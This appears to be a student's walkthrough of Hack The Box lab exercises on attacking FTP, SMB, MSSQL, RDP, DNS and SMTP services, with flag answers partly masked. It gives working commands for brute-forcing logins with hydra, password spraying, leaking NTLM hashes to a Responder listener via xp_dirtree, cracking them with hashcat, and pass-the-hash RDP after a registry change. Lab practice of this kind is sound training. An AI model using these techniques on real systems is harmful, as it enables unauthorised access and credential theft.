# Attacking FTP
Enumerate the target
sudo nmap -sC -sV <Target IP>
FTP open on port 2***
*Apparently sometimes the port 2*** doesn't show up during the scan, if that happens, restart the Target VM*

Anonymously log into the target via ftp
ftp anonymous@<Target IP> -p 2***

Check for files with ls

Download the users.list and passwords.list
get users.list
get passwords.list

Use hidra to brute force the username and password, this will take a few minutes
hydra -L users.list -P passwords.list ftp://<Target IP>:2***

Found username and password

use the new username and password to ssh into the Target
ssh r****@<Target Ip>

Find the flag on the machine using ls
cat flag.txt

# Attacking SMB
For the first question, 
use smbmap -H <Target IP>
*Look for the one with read only permissions*

For the second question, 
sudo crackmapexec smb <Target Ip> -u jason -p pws.list --local-auth
*pws.list is in the resources section on the top of the page*

For the third question, 
smbclient //<Target IP>/G** -U jason
get id_rsa
open new terminal where id_rsa was downloaded, then chmod 600 id_rsa
ssh -i id_rsa jason@<Target IP>
cat flag.txt

# Attacking SQL Databases
In Shell #1 log into the database using the given credentials
mssqlclient.py -p 1433 htbdbuser@<Target IP>
SELECT 1
GO

Open Shell #2
Sudo Responder -I tun0

In Shell #1
EXEC master..xp_dirtree '\\<Attacker IP>\Share'
GO

In shell #3 -> Copy the hash into a text file
nano hash
<paste the hash>
CTRL X
Y
<ENTER>
hashcat -m 5600 hash rockyou.txt -> I always copy the files I need into the same folder and open the shells in that folder so I don't need to paste the whole path to the file
Got the password: prin*****

In shell #4
mssqlclient.py -p 1433 mssqlsvc@<Target IP> -windows-auth
enter password
USE flagDB
SELECT * FROM tb_flag

# Attacking RDP
For the first question simply log in with the given credentials 'htb-rdp' and 'HTBRocks!', then read the file on the desktop

For the second question, don't close the RDP connection, open cmd and write: 
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
Then, simply open another Shell on your Attacker VM and connect using xfreerdp again while keeping the previous RDP connection, but this time use the following:
xfreerdp /v:192.168.220.152 /u:<user you found in the file you needed for question 1> /pth:<hash you found in the file you needed for question 1>
With this, you will have another RDP window opened, and you can see flag.txt on the desktop

# Attacking DNS
First enumerate the host:
nmap -p53 -Pn -sV -sC <Target IP>

Before using subdomains,add to /etc/hosts file the following:
<Target IP> inlanefreight.htb

After that, use subbrute to find out accessible subdomains:
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.htb -> This step is very slow, take a 5 minute break :)
*You will get a list of subdomains*

use dig to transfer zones from inlanefreight.htb to one of the subdomains
dig AXFR @inlanefreight.htb <subdomain.inlanefreight.htb>

# Attacking SMTP
*Note: You might need to restart the target machine a few times throughout the steps if the commands don't work*
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t <target IP> -> users.list downloaded from HTB resources
Found user m*****@inlanefreight.htb

hydra -l m*****@inlanefreight.htb -P pws.list pop3://10.129.188.160 -t 10 -> pws.list downloaded from HTB resources
Found password p*******

telnet <Target IP> 110 
USER m*****@inlanefreight.htb
pass p*******
LIST
RETR 1
